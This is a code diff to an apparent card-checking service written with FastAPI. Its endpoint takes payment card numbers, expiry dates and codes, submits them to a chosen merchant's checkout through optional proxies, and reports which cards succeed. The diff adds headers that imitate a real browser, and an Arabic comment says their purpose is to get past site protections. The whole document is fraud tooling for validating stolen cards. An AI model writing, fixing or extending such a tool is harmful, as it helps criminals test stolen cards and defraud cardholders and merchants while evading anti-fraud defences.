@@ -3,17 +3,19 @@ import httpx
 
 app = FastAPI()
 
-GATEWAY_PRICES = {
-    "Shopify": "31.0",
-    "AuthNet": "20.0",
-    "PayPal": "10.0"
-}
+GATEWAY_PRICES = {"Shopify": "31.0", "AuthNet": "20.0", "PayPal": "10.0"}
 
+# تحديث الـ Headers لتجاوز الحماية وجعل الطلب يبدو كأنه من متصفح حقيقي
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-    "Accept": "application/json, text/javascript, */*; q=0.01",
-    "Accept-Language": "en-US,en;q=0.9",
-    "Connection": "keep-alive"
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Referer": "https://www.google.com/",
+    "Connection": "keep-alive",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "cross-site"
 }
 
 @app.api_route("/check", methods=["GET", "POST"])
@@ -25,9 +27,7 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
             site = f"https://{site}"
             
         request_headers = HEADERS.copy()
-        request_headers["Referer"] = f"{site}/"
-        request_headers["Origin"] = site
-
+        
         cc_parts = cc.split('|')
         payload = {
             "card_number": cc_parts[0],
@@ -37,7 +37,6 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
             "amount": price
         }
 
-        # معالج البروكسي
         formatted_proxy = None
         if proxy:
             clean_proxy = proxy.strip().replace("http://", "").replace("https://", "")
@@ -53,24 +52,24 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
         transport = httpx.AsyncHTTPTransport(proxy=formatted_proxy) if formatted_proxy else None
 
         async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
-            target_url = f"{site}/checkout"
+            # استخدام مسار cart/checkout الأكثر توافقاً مع طلبات الـ POST
+            target_url = f"{site}/cart/checkout"
             response = await client.post(target_url, data=payload)
             
-            # استخراج رد البوابة الحقيقي
+            # محاولة قراءة الرد، وإذا فشل، الرد سيكون الـ StatusCode
             try:
                 data = response.json()
-                # البحث عن رسالة الخطأ في حقول الـ JSON الشائعة
-                resp_msg = data.get("message") or data.get("error") or data.get("reason") or "CARD_DECLINED"
-                status = "true" if data.get("success") == True or data.get("status") == "succeeded" else "false"
+                resp_msg = data.get("message") or data.get("error") or "CARD_DECLINED"
+                status = "true" if data.get("success") == True or response.status_code == 200 else "false"
             except:
-                resp_msg = "DECLINED_NO_RESPONSE"
+                resp_msg = f"STATUS_CODE_{response.status_code}"
                 status = "false"
             
             return {
                 "Gateway": gateway,
                 "Price": price,
                 "Proxy": "Live" if proxy else "None",
-                "Response": resp_msg, # هنا سيرسل الرد الفعلي من البوابة
+                "Response": resp_msg,
                 "Status": status,
                 "CC": cc
             }
@@ -80,7 +79,7 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
             "Gateway": gateway,
             "Price": price,
             "Proxy": "Error",
-            "Response": str(e),
+            "Response": "CONN_ERROR",
             "Status": "false",
             "CC": cc
         }
